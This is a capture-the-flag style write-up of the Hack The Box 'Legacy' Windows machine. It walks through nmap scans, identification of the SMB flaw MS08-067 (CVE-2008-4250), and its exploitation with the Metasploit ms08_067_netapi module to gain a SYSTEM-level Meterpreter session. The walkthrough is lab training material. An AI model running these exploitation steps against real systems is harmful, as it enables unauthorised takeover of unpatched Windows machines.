# Hack The Box - Legacy

## Machine Information

| Field            | Details                                                               |
| ---------------- | --------------------------------------------------------------------- |
| Platform         | Hack The Box                                                          |
| Machine          | Legacy                                                                |
| Difficulty       | Easy                                                                  |
| Operating System | Windows                                                               |
| Category         | Network Exploitation, SMB, Privilege Escalation                       |
| Main Skills      | SMB enumeration, MS08-067 exploitation, Windows remote code execution |

---

# Overview

Legacy is a Windows machine that demonstrates the impact of running outdated services.

The machine is vulnerable due to an unpatched SMB service, allowing remote code execution without authentication.

The attack path includes:

* Service enumeration
* SMB vulnerability identification
* Remote exploitation
* SYSTEM access

---

# Reconnaissance

The first step was identifying exposed services.

## Nmap Scan

```bash id="3m8x1q"
nmap -sC -sV -oN nmap.txt <TARGET_IP>
```

The scan revealed:

```text id="6v2p9s"
135/tcp Microsoft RPC
139/tcp NetBIOS
445/tcp SMB
```

The SMB service was analyzed further.

---

# SMB Enumeration

The SMB service version was identified.

```bash id="9q4w7n"
nmap --script smb-vuln* -p445 <TARGET_IP>
```

The scan revealed that the machine was vulnerable to:

```text id="4x7m2p"
MS08-067
```

---

# Vulnerability Discovery

The vulnerability affects the Windows Server service.

Affected systems allow remote attackers to execute arbitrary code through a specially crafted request.

Vulnerability:

```text id="8k3m5v"
CVE-2008-4250
```

---

# Exploitation

The vulnerability was exploited using Metasploit.

Starting Metasploit:

```bash id="5p9n2x"
msfconsole
```

Searching for the exploit:

```bash id="1v6q8m"
search ms08_067
```

Loading the module:

```bash id="7m3k9w"
use exploit/windows/smb/ms08_067_netapi
```

Configuring the target:

```bash id="2x8n4q"
set RHOSTS <TARGET_IP>
```

Running the exploit:

```bash id="6w5p1z"
run
```

A Meterpreter session was obtained.

---

# System Enumeration

The current privileges were checked:

```bash id="3q9m7x"
getuid
```

Output:

```text id="8v2k5p"
NT AUTHORITY\SYSTEM
```

The exploit provided full system privileges.

---

# Flag Retrieval

The user flag was found:

```text id="9x4m6n"
C:\Documents and Settings\<user>\Desktop\user.txt
```

The administrator flag was found:

```text id="5z8q2m"
C:\Documents and Settings\Administrator\Desktop\root.txt
```

---

# Tools Used

* Nmap
* SMB enumeration scripts
* Metasploit
* Meterpreter

---

# Vulnerabilities Identified

## MS08-067 Remote Code Execution

**Type:** Remote Code Execution

**CVE:** CVE-2008-4250

**Impact:**

An unauthenticated attacker can execute arbitrary code remotely and gain complete control of an affected Windows machine.
